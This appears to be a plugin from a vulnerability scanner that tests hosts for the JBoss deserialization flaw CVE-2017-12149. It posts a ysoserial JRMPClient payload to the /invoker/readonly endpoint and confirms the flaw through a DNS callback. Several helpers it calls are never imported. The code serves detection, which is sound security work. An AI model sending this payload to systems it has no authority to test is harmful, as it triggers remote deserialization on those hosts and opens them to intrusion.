import requests
from celery_app.utils.utils import insert_vuln_db
from celery_app.config.config import web_port_short

#Jboss 反序列化漏洞（CVE-2017-12149）
plugin_id=76
default_port_list=web_port_short


def check(host, port=80):
    scheme = 'https' if '443' in str(port) else 'http'
    target = '{}://{}:{}/invoker/readonly'.format(scheme, host, port)
    payload_str, payload_dns = new_dns_payload()
    payload = Ysoserial().generate(payload='JRMPClient', command=payload_dns)
    try:
        requests.post(target, data=payload, timeout=10)
    except:
        pass
    results = have_records(payload_str)
    if results:
        output = payload_str
        insert_vuln_db(host, target, output, plugin_id)
        return True, host, target, output
    return False

